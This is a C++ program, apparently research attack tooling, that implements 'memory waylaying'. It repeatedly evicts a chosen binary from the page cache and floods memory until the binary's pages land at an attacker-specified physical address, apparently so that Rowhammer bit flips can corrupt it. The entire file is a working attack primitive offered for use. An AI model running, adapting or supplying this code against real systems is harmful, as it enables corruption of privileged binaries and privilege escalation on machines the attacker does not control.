#include "libhammer.h"
#include "set"
using namespace std;

uint64_t current_pa, target_pa, step = 0;
vector<Page> pool;
set<uint64_t> paset;

void waylaying(const string& path, int dir)
{
    uint64_t i, j, mem_size = get_available_mem() + 64 * 1024000ull;
    uint64_t cached_ns, uncached_ns;
//    uint64_t cached_count = 0, uncached_count = 0, fast_count = 0;
    double total = mem_size / PAGE_SIZE;
    char *memfile=0, *image=0, c=0;
    int fd, fbin, sz, gb_total = mem_size / 1024000000ull, gb_start, gb_end;
    struct stat st;
    volatile uint64_t tmp = 0;
    myclock clk, cl2;
    const uint64_t gb_size = PAGE_SIZE * 250000ull;

    // open eviction file
    ASSERT(-1 != (fd = open("memfile", O_RDONLY)) );
    ASSERT(0 != (memfile = mmap(0, mem_size, PROT_READ | PROT_EXEC, MAP_PRIVATE, fd, 0)) );

    // hold target binary
    ASSERT(-1 != (fbin = open(path.c_str(), O_RDONLY)) );
    fstat(fbin, &st);
    sz = st.st_size;

    ASSERT(0 != (image = mmap(0, sz, PROT_READ, MAP_PRIVATE, fbin, 0)) );
    ASSERT(image != -1);
    tmp += *(volatile uint64_t *)image;      // access

    //cout << gb_total << endl;
    //pause();
    if (dir == 1)
    {
        gb_start = 0; gb_end = gb_total + 1;
    }
    else if (dir == -1)
    {
        gb_start = gb_total; gb_end = -1;
    }

    // cout << "- start eviction" << endl;
    START_CLOCK(cl2, CLOCK_MONOTONIC);
    for (j=gb_start; j!=gb_end; j+=dir)
    {
        cout << dec << j << "G";
        for (i=0; i<gb_size; i+=PAGE_SIZE)
        {
            if (i+j*gb_size > mem_size) break;

            START_CLOCK(clk, CLOCK_MONOTONIC);
            tmp += (uint8_t)memfile[i + j * gb_size];
            END_CLOCK(clk);

            if (i>0 && i % (1<<24)==0) {
               if (clk.ns < 150)
                    cout << "-";
               else if (clk.ns < 1000)
                    cout << ".";
               else
                    cout << "+";
               cout.flush();

               // use mincore to check if image is evicted
               ASSERT(mincore(image, PAGE_SIZE, &c) == 0);
               if ((c & 1) == 0) break;
            }
        }
        if ((c & 1) == 0) break;
        cout << endl;
    }
    END_CLOCK(cl2);
    cout << endl;
    // print statictics
    cout << "Evicted after " << dec << (j*1000+i/1024000) << "M, Time: " << (cl2.ns / 1000) / 1.0e6 << " s" << endl;

    close(fd);
    munmap(memfile, mem_size+PAGE_SIZE);
    close(fbin);
    munmap(image, sz);
}

int main(int argc, char **argv)
{
    if (argc < 2)
    {
        cout << "usage: waylaying [path] [addr]" << endl;
        cout << "       addr should be page-aligned" << endl;
        return 0;
    }

    string fname(argv[1]);
    stringstream ss;
    uint64_t pool_mb, tmp = 0, min_pa, max_pa;
    int dir = 1;

    int fbin, sz, last_cover = 0, cnt = 0;
    struct stat st;

    ss << hex << argv[2]; ss >> target_pa;
    current_pa = get_binary_pa(fname);
    min_pa = max_pa = current_pa;
    cout << "path: " << fname << ", pa=" << hex << current_pa << " target pa=" << target_pa << endl;    cout << "+ preparing..." << endl;
    cout << "+ start waylaying loop..." << endl;
    while (current_pa != target_pa)
    {
        ++step;
                // hold target binary
        ASSERT(-1 != (fbin = open(fname.c_str(), O_RDONLY)) );
        fstat(fbin, &st);
        sz = st.st_size;

        ASSERT(0 == posix_fadvise(fbin, 0, sz, POSIX_FADV_DONTNEED));

        close(fbin);
        //usleep(200000);

        current_pa = get_binary_pa(fname);
        if (current_pa < min_pa) min_pa = current_pa;
        if (current_pa > max_pa) max_pa = current_pa;
        last_cover = paset.size();
        paset.insert(current_pa);
        if (last_cover == paset.size())
        {
            ++cnt;
            if (cnt >= 30)
                waylaying(fname, 1);
        }
        else cnt=0;
        cout << "+ step " << dec << step << ": " << hex << current_pa
//              << " min=" << min_pa << " max=" << max_pa
              << " coverage=" << dec << paset.size()*4 << "k / " << (max_pa - min_pa)/1024 << "k" << endl;
        dir = -dir;
    }

    return 0;
}
